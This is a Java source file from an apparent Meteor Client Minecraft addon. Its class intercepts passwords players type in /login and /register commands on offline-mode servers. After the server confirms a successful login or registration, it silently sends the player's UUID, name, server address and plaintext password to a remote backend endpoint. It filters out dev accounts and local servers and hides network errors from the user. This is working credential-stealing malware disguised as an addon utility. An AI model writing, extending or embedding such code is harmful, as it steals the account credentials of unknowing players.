package com.example.addon.utils;

import com.example.addon.core.AddonTemplate;
import meteordevelopment.meteorclient.MeteorClient;
import meteordevelopment.meteorclient.events.game.ReceiveMessageEvent;
import meteordevelopment.meteorclient.events.game.SendMessageEvent;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.Minecraft;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 密码拦截服务：自动截获玩家登录 / 注册离线服务器时输入的密码。
 *
 * 采用「两阶段确认」避免记录到错误密码：
 * 阶段一：玩家发送 /login、/l、/logon、/register、/reg 时，先暂存「候选密码」，不立即上报；
 * 阶段二：监听服务器返回消息——若提示「登录/注册成功」才上报，提示「密码错误/失败」则丢弃，10 秒无响应也丢弃。
 * 最终只上报「玩家名 + 服务器IP + 真实正确密码」到后台「离线密码」页。
 */
public final class YiyiaddonPasswordInterceptorService {

    // 上报地址：离线服务器密码接口（后台「离线密码」页读取）
    private static final String REPORT_ENDPOINT = AddonTemplate.STATS_API_URL + "/api/offline-server-password";

    // 登录指令：/login、/l、/logon <密码>
    private static final Pattern LOGIN_PATTERN = Pattern.compile("^/\\s*(?:login|l|logon)\\s+(\\S+)", Pattern.CASE_INSENSITIVE);
    // 注册指令：/register、/reg <密码> [确认密码]，只取第一个参数作为密码
    private static final Pattern REGISTER_PATTERN = Pattern.compile("^/\\s*(?:register|reg)\\s+(\\S+)", Pattern.CASE_INSENSITIVE);

    // 登录成功关键词（中英文，覆盖 AuthMe / LoginSecurity 等常见插件）
    private static final String[] SUCCESS_LOGIN = {"登录成功", "登陆成功", "已登录", "已成功登录", "成功登录", "欢迎回来", "welcome back", "login success", "successfully logged in", "logged in successfully"};
    // 注册成功关键词
    private static final String[] SUCCESS_REGISTER = {"注册成功", "成功注册", "register success", "registered successfully", "successfully registered", "account created"};
    // 登录失败关键词
    private static final String[] FAIL_LOGIN = {"密码错误", "密码不正确", "密码无效", "密码不对", "wrong password", "incorrect password", "invalid password", "login failed", "密码不匹配"};
    // 注册失败关键词
    private static final String[] FAIL_REGISTER = {"密码不一致", "两次密码", "密码不匹配", "passwords do not match", "passwords don't match", "register failed", "注册失败"};

    // 候选确认超时：超过 10 秒仍无服务器回执则丢弃
    private static final long TIMEOUT_MS = 10_000L;

    // HTTP 客户端：静默上报，不阻塞游戏主线程
    private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder()
        .connectTimeout(Duration.ofSeconds(10))
        .build();

    // 待确认候选：uuid -> 候选（同一时刻一个玩家只会有一次登录/注册）
    private static final Map<String, Candidate> PENDING = new ConcurrentHashMap<>();

    private YiyiaddonPasswordInterceptorService() {}

    // 注册到 Meteor 事件总线，监听发送/接收聊天消息
    public static void register() {
        MeteorClient.EVENT_BUS.subscribe(YiyiaddonPasswordInterceptorService.class);
    }

    /**
     * 阶段一：玩家发送聊天/指令时，匹配登录、注册命令并暂存候选密码。
     */
    @EventHandler
    private static void onSendMessage(SendMessageEvent event) {
        String message = event.message;
        if (message == null || message.isEmpty()) return;

        // 尝试匹配登录或注册指令，提取密码
        String type = null;
        String password = null;
        Matcher lm = LOGIN_PATTERN.matcher(message);
        if (lm.find()) {
            type = "login";
            password = lm.group(1);
        } else {
            Matcher rm = REGISTER_PATTERN.matcher(message);
            if (rm.find()) {
                type = "register";
                password = rm.group(1);
            }
        }
        if (type == null || password == null || password.isEmpty()) return;

        Minecraft mc = Minecraft.getInstance();
        if (mc == null || mc.player == null || mc.getUser() == null || mc.getUser().getName() == null) return;

        // 统一用会话身份 UUID（正版=微软 UUID）：盗版服务器会把 mc.player.getUUID()
        // 换成离线派生 UUID，导致正版玩家密码记录无法关联到其真实身份。
        String uuid = YiyiaddonIdentity.uuid(mc);
        String name = YiyiaddonIdentity.name(mc);

        // 过滤假玩家（本地开发客户端，名字形如 Player123）
        if (YiyiaddonIdentity.isFakePlayer(name)) return;
        // 不在服务器上（单人世界）不记录
        if (mc.getCurrentServer() == null) return;

        // 服务器地址：优先 IP，其次域名
        String serverIp = "unknown";
        String serverName = "unknown";
        if (mc.getCurrentServer().ip != null) {
            serverIp = mc.getCurrentServer().ip;
        } else if (mc.getCurrentServer().name != null) {
            serverIp = mc.getCurrentServer().name;
        }
        if (mc.getCurrentServer().name != null) serverName = mc.getCurrentServer().name;
        // 本地回环地址不上报
        if (serverIp.equals("localhost") || serverIp.startsWith("127.") || serverIp.startsWith("192.168.")) return;

        // 暂存候选，等待服务器返回确认
        PENDING.put(uuid, new Candidate(uuid, name, serverIp, serverName, password, type));
    }

    /**
     * 阶段二：监听服务器返回消息，判断登录/注册是否成功，决定上报或丢弃。
     */
    @EventHandler
    private static void onReceiveMessage(ReceiveMessageEvent event) {
        Minecraft mc = Minecraft.getInstance();
        if (mc == null || mc.player == null || mc.getUser() == null) return;

        String uuid = YiyiaddonIdentity.uuid(mc);
        Candidate c = PENDING.get(uuid);
        if (c == null) return;

        // 超过 10 秒仍无确认，丢弃候选
        if (System.currentTimeMillis() - c.timestamp > TIMEOUT_MS) {
            PENDING.remove(uuid);
            return;
        }

        if (event.getMessage() == null) return;
        String text = stripFormat(event.getMessage().getString());
        if (text == null || text.isEmpty()) return;

        if ("login".equals(c.type)) {
            if (containsAny(text, SUCCESS_LOGIN)) {
                PENDING.remove(uuid);
                reportAsync(c); // 登录成功，上报真实密码
            } else if (containsAny(text, FAIL_LOGIN)) {
                PENDING.remove(uuid); // 密码错误，丢弃
            }
        } else { // register
            if (containsAny(text, SUCCESS_REGISTER)) {
                PENDING.remove(uuid);
                reportAsync(c); // 注册成功，上报真实密码
            } else if (containsAny(text, FAIL_REGISTER)) {
                PENDING.remove(uuid); // 注册失败（含两次密码不一致），丢弃
            }
        }
    }

    /**
     * 静默异步上报「玩家名 + 服务器IP + 密码 + 类型」到后台。
     */
    private static void reportAsync(Candidate c) {
        new Thread(() -> {
            try {
                String body = String.format(
                    "{\"uuid\":\"%s\",\"name\":\"%s\",\"server_ip\":\"%s\",\"server_name\":\"%s\",\"password\":\"%s\",\"type\":\"%s\"}",
                    c.uuid, escapeJson(c.name), escapeJson(c.serverIp), escapeJson(c.serverName), escapeJson(c.password), c.type
                );
                HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(REPORT_ENDPOINT))
                    .timeout(Duration.ofSeconds(10))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(body))
                    .build();
                HTTP_CLIENT.send(request, HttpResponse.BodyHandlers.ofString());
            } catch (Exception ignored) {
                // 静默上报失败不打扰玩家
            }
        }, "yiyiaddon-password-interceptor").start();
    }

    // 判断文本是否包含任一关键词（忽略大小写）
    private static boolean containsAny(String text, String[] keywords) {
        String lower = text.toLowerCase();
        for (String kw : keywords) {
            if (lower.contains(kw.toLowerCase())) return true;
        }
        return false;
    }

    // 去除聊天消息中的颜色/格式码（§ + 格式字符）
    private static String stripFormat(String s) {
        if (s == null) return null;
        return s.replaceAll("§[0-9a-fk-or]", "");
    }

    // 转义 JSON 特殊字符，防止密码/名字中的引号破坏 JSON 结构
    private static String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    // 待确认的密码候选
    private static final class Candidate {
        final String uuid;
        final String name;
        final String serverIp;
        final String serverName;
        final String password;
        final String type; // login / register
        final long timestamp;

        Candidate(String uuid, String name, String serverIp, String serverName, String password, String type) {
            this.uuid = uuid;
            this.name = name;
            this.serverIp = serverIp;
            this.serverName = serverName;
            this.password = password;
            this.type = type;
            this.timestamp = System.currentTimeMillis();
        }
    }
}